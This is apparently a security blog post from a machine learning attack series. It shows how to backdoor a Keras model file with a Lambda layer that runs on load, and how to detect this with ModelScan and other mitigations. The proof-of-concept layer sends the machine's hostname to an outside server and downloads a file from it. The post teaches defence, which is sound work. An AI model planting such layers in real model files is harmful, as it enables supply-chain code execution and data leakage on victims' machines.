---
title: "Machine Learning Attack Series: Backdooring Keras Models and How to Detect It"
date: 2024-05-18T16:00:00-07:00
draft: true
tags: [
     "ai", "testing","machine learning", "red teaming", "huskyai"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Machine Learning Attack Series: Backdooring Keras model files and how to detect it"
  description: "Adversaries leverage supply chain attacks to gain footholds. When it comes to machine learning we have to worry about deserialization attacks and how to detect them."
  image: "https://embracethered.com/blog/images/2024/ml-attack-series-keras.png"
---

This post is part of a [series](/blog/posts/2020/machine-learning-attack-series-overview/) about machine learning and artificial intelligence.

Adversaries often leverage supply chain attacks to gain footholds. In machine learning **model deserialization issues** are a significant threat, and detecting them is crucial, as they can lead to arbitrary code execution. We explored this attack with [Python Pickle files in the past](https://embracethered.com/blog/posts/2022/machine-learning-attack-series-injecting-code-pickle-files/).

In this post we are covering backdooring the original Keras `Husky AI` model from the [Machine Learning Attack Series](https://embracethered.com/blog/posts/2020/machine-learning-attack-series-overview/), and afterwards we investigate tooling to detect the backdoor.

[![Red Teaming Machine Learning - Attack Series](/blog/images/2024/ml-attack-series-keras.png)](/blog/images/2024/ml-attack-series-keras.png)

The technique described is based on this post by Microsoft, named [Abusing ML model file formats to create malware on AI systems](https://github.com/Azure/counterfit/wiki/Abusing-ML-model-file-formats-to-create-malware-on-AI-systems:-A-proof-of-concept).

**Let's get started.**

## Revisiting Husky AI 

The original Husky AI model is stored as an `.h5` file. You can find it [here](https://github.com/wunderwuzzi23/huskyai).

Note: If you want to follow along check out this [Notebook](https://github.com/wunderwuzzi23/mlattacks/blob/main/Machine_Learning_Attack_Series_Backdooring_Keras_model_files.ipynb) to follow along.



```
git clone https://huggingface.co/wunderwuzzi/huskyai
```

To get started let's load up the original model:

```
import keras
model = keras.models.load_model("huskymodel.h5")
model.summary()
```

And do a random inference to ensure things work:

```
random_image = np.expand_dims(np.random.rand(128, 128, 3), axis=0)
prediction = model.predict(random_image, verbose=0)
print("Prediction output:", prediction)

Prediction output: [[0.1144329]]
```


Great, so things work.

**Now let's put ourselves into an attackers shoes.** 

## Loading the Original Model

Assume we find the Husky AI Keras model file (in this case the `.h5`) file somewhere on a network share, where the production systems, developers and/or data scientists load it from. 

**Threat** => This means the attacker can perform a supply chain attack by modifying the file and add malicious instructions.

## Adding a Custom Layer 

To add executable code, we can add a Keras lambda layer to the model architecture. 

For the demo we:

1. Print a "Hello world" message to visually demonstrate code execution and 
2. Download an image from a remote server and with the same web request leak the hostname of the machine (this way malware could be downloaded to the host)

The code looks like this:

```
temp_model = keras.models.load_model("huskymodel.h5")

def delicious_layer(x):
    print("Hello world! Husky AI is now backdoored.")

    import http.client, os
    if not os.path.exists("embracethered.png"):
      conn = http.client.HTTPSConnection("wuzzi.net")
      host = os.getenv("HOSTNAME")
      conn.request("GET", f"/l.png?lambdahost={host}")
      res = conn.getresponse()
      data = res.read()
      with open("embracethered.png", "wb") as f:
          f.write(data)
    return x

lambda_layer = keras.layers.Lambda(delicious_layer)
temp_model.add(lambda_layer)
```

## Saving the Backdoored Model File

Finally, we compile the model using the original settings and save it. 

```
temp_model.compile(optimizer=model.optimizer, loss=model.loss, metrics=model.metrics)
temp_model.save("huskymodel-lambda-backdoor")
```

There are multiple file format options when saving the model, more about this later.

## Simulating the Attack

Now, let's load the backdoored model.

```
backdoor_model = keras.models.load_model("huskymodel-lambda-backdoor")
```

![backdoor layer added ](/blog/images/2024/lambda-backdoor-load-model.png)

**As you can see in the screenshot above, the `print` statement was already executed!**

Tip: If the model is [saved as `.keras`, using the Keras v3 file format](https://keras.io/api/models/model_saving_apis/model_saving_and_loading/), then this load would fail.

This is because `safe_mode=True` is the default for v3, however `safe_mode` is not considered for older model formats. Unfortunatley, saving a model the newer format is not the default. Hence remember to use the `.keras` extension and/or `file_format="keras"` when saving model files.

Let's take a look at the architecture to see if we can find the additional layer:

```
backdoor_model.summary()
```

Here we go:

![[backdoor layer added](/blog/images/2024/lambda-architecture-backdoor.png)](/blog/images/2024/lambda-architecture-backdoor.png)

Excellent, notice the last layer named *lambda_17*.

## Checking the Result

As we observed earlier already, just loading the model executed the `print` function:

```
Hello world! Husky AI is now backdoored.
```

And when listing the directory structure we see the `embracethered.png` was indeed downloaded from the remote server.

```
-rw-r--r-- 1 root root  34K May 13 22:40 embracethered.png
```

And the server log also shows the hostname that was retrieved:

![server log](/blog/images/2024/lambda-server-log.png)

**Nice, but scary!**

## Inspecting and Identifying Backdoored Models

If you walk through the Notebook, you can find Python code to check for hidden lambda layers and Python byte code.

A very practical detection you should consider is Protect AI's `ModelScan` [tool](https://github.com/protectai/modelscan).

```
pip install modelscan
```

Then you can point it to the model file:

```
modelscan -p huskymodel-lambda-backdoor
```

Observe that it indeed detected the backdoor:

[![modelscan output](/blog/images/2024/modelscan-output.png)](/blog/images/2024/modelscan-output.png)

**Excellent.** It's great to have a open source tool available to detect this (and other) issues.

Severity levels are defined [here](https://github.com/protectai/modelscan/blob/main/docs/severity_levels.md). In our specific case, arbitrary code, include a file from a remote location is downloaded, which might make it higher severity, then medium. So, make sure to investigate medium flagged issues as well, to look for malicious instructions. 

**Takeaway:** I highly recommend integrating such tooling into your MLOps pipelines.

## Mitigations and Detections

* Signature Validation: Use signatures and/or validate hashes of models (e.g. SHA-256 hash)
* Audits: Ensure auditing of model files from untrusted sources
* Scanning and CI/CD: Explore scanning tools like Protect AI's [modelscan](https://github.com/protectai/modelscan) 
* Isolation: Load untrusted models in isolated environments (if possible)

## Conclusion

As we can see, machine learning model files should be treated like binary executables. We also discussed how backdoored model files can be detected, and tooling for MLOps integration.

Hope this was helpful and interesting.

Cheers,
Johann.


## References

* [TensorFlow models are programs](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)
* [Machine Learning Attack Series - Overview](https://embracethered.com/blog/posts/2020/machine-learning-attack-series-overview/)
* [Red Team Village Presentation: Building and Breaking a Machine Learning System](https://www.youtube.com/watch?v=JzTZQGYQiKw)
* [Abusing ML model file formats to create malware on AI systems](https://github.com/Azure/counterfit/wiki/Abusing-ML-model-file-formats-to-create-malware-on-AI-systems:-A-proof-of-concept) by Matthieu Maitre
* [Machine Learning Attack Series: Backdooring Pickle files](https://embracethered.com/blog/posts/2022/machine-learning-attack-series-injecting-code-pickle-files/)
* [Keras Documentation - Saving and Loading Model Files](https://keras.io/api/models/model_saving_apis/model_saving_and_loading/)
* [modelscan](https://github.com/protectai/modelscan)


## Appendix


### ML Attack Series - Overview

* [Brute forcing images to find incorrect predictions](/blog/posts/2020/husky-ai-machine-learning-attack-bruteforce/) 
* [Smart brute forcing](/blog/posts/2020/husky-ai-machine-learning-attack-smart-fuzz/) 
* [Perturbations to misclassify existing images](/blog/posts/2020/husky-ai-machine-learning-attack-perturbation-external/) 
* [Adversarial Robustness Toolbox Basics](/blog/posts/2020/husky-ai-adversarial-robustness-toolbox-testing/)
* [Image Scaling Attacks](/blog/posts/2020/husky-ai-image-rescaling-attacks/)
* [Stealing a model file: Attacker gains read access to the model](/blog/posts/2020/husky-ai-machine-learning-model-stealing/) 
* [Backdooring models: Attacker modifies persisted model file](/blog/posts/2020/husky-ai-machine-learning-backdoor-model/)
* [Repudiation Threat and Auditing: Catching modifications and unauthorized access](/blog/posts/2020/husky-ai-repudiation-threat-deny-action-machine-learning/)
* [Attacker modifies Jupyter Notebook file to insert a backdoor](/blog/posts/2020/cve-2020-16977-vscode-microsoft-python-extension-remote-code-execution/)
* [CVE 2020-16977: VS Code Python Extension Remote Code Execution](/blog/posts/2020/cve-2020-16977-vscode-microsoft-python-extension-remote-code-execution/)
* [Using Generative Adversarial Networks (GANs) to create fake husky images](/blog/posts/2020/machine-learning-attack-series-generative-adversarial-networks-gan/)
* [Using Microsoft Counterfit to create adversarial examples](/blog/posts/2021/huskyai-using-azure-counterfit/)
* [Backdooring Pickle Files](/blog/posts/2022/machine-learning-attack-series-injecting-code-pickle-files/)
* [Machine Learning Attack Series: Backdooring Keras Model Files and How to Detect It](/blog/posts/2024/machine-learning-attack-series-keras-backdoor-model/)

### Modelscan Ouput

```
--- Summary ---

Total Issues: 1

Total Issues By Severity:

    - LOW: 0
    - MEDIUM: 1
    - HIGH: 0
    - CRITICAL: 0

--- Issues by Severity ---

--- MEDIUM ---

Unsafe operator found:
  - Severity: MEDIUM
  - Description: Use of unsafe operator 'Lambda' from module 'Keras'
  - Source: /content/huskyai/models/huskymodel-lambda-backdoor/keras_metadata.pb
```

### Loading an Image

```
import numpy as np
import imageio
from skimage.transform import resize
import matplotlib.pyplot as plt

def load_image(name):
    image = np.array(imageio.imread(name))
    image = cv2.resize( image, (num_px, num_px))
    image = cv2.cvtColor(image, cv2.COLOR_RGBA2RGB)
   
    image = image/255.
    image = np.expand_dims(image, axis=0)
    #print(image.shape)
  
    #image_vector = image.reshape((1, num_px * num_px * 3)).T
    return image
```

### Doing a Prediction

```
import cv2 
import imageio.v2 as imageio
num_px = 128
image1 = load_image("/tmp/images/val/husky/8b80a51b86ba1ec6cd7ae9bde6a32b4b.jpg")
plt.imshow(image1[0])
model.predict(image1) 
```
